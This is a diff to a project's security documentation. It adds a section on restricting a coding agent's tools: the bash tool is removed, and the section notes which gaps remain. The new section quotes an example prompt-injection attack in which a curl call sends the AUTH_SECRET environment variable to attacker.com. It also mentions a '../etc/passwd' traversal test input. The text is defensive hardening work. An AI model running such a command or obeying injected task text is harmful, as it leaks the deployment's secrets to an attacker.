@@ -1,10 +1,40 @@
 # Security Boundary — HMAC Trust + Credential Cipher + Key Rotation
 
-This document covers three security primitives that protect the CP ↔ workspace trust boundary.
+This document covers security primitives that protect the CP ↔ workspace trust boundary.
 
 ---
 
-## 1. HMAC Trust Boundary
+## 1. Coding-Agent Capability Constraints (Sprint 15 Story 01)
+
+The coding agent's tool set is constrained to a narrow set of operations. The `bash` tool (which
+allowed arbitrary shell commands) was removed in Sprint 15 Story 01. It is replaced by six narrow
+replacement tools that each accept no arbitrary arguments:
+
+| Tool                      | Command              | Description                                                                  |
+| ------------------------- | -------------------- | ---------------------------------------------------------------------------- |
+| `npm_test`                | `pnpm test`          | Run the workspace test suite                                                 |
+| `npm_build`               | `pnpm build`         | Compile the workspace                                                        |
+| `npm_typecheck`           | `pnpm typecheck`     | TypeScript type-check without a full build                                   |
+| `git_status_readonly`     | `git status --short` | Read-only view of modified files — no commit or push                         |
+| `read_package_json(name)` | —                    | Read `node_modules/<name>/package.json`; validates name to prevent traversal |
+| `list_installed_packages` | —                    | List `dependencies` + `devDependencies` keys from workspace `package.json`   |
+
+**What this closes**: the trivial shell-escape path where a prompt-injected task could call
+`bash({command: "curl https://attacker.com/$(printenv AUTH_SECRET)"})`.
+
+**What this does NOT close**: workflow nodes can still `fetch` arbitrary URLs (tracked in the
+egress-declaration backlog). Full process isolation is a Sprint 20+ story.
+
+**Validation**: `pnpm --filter @platform/workspace-mcp test:unit` includes:
+
+- `test/tools/AgentTools.no-bash.test.ts` — asserts `bash` is not in the registry.
+- `test/tools/AgentTools.bash-regression.test.ts` — stubs an LLM to attempt `bash`; asserts
+  `NoSuchToolError` is returned cleanly (no hang).
+- `test/tools/ReadPackageJsonTool.test.ts` — rejects `../etc/passwd`, slash paths, dotdot.
+
+---
+
+## 2. HMAC Trust Boundary
 
 All server-to-server requests between the control plane (CP) and a workspace installation
 are authenticated with HMAC-SHA256 over a per-workspace shared secret (the "pairing secret").
@@ -40,7 +70,7 @@ rotate the pairing secret after every restart (the rotation clears the CP's memo
 
 ---
 
-## 2. Credential Cipher — AES-256-GCM at Rest
+## 3. Credential Cipher — AES-256-GCM at Rest
 
 Every database-managed credential's secret material is encrypted at rest with AES-256-GCM.
 Implementation: `packages/host/src/domain/credentials/CredentialSecretCipher.ts`.
@@ -70,7 +100,7 @@ This ensures the correct error is thrown even when the env changes.
 
 ---
 
-## 3. Cipher Key Rotation Contract
+## 4. Cipher Key Rotation Contract
 
 When `CODEMATION_CREDENTIALS_MASTER_KEY` is changed (rotated), any credential encrypted with the
 old key will **fail loudly** at decrypt time with `CredentialKeyRotatedError`.
@@ -98,7 +128,7 @@ failure and, where Story B audit logging is active, produces an audit row tagged
 
 ---
 
-## 4. Pairing Secret Rotation
+## 5. Pairing Secret Rotation
 
 When a workspace's pairing secret is rotated via the control-plane admin API:
 
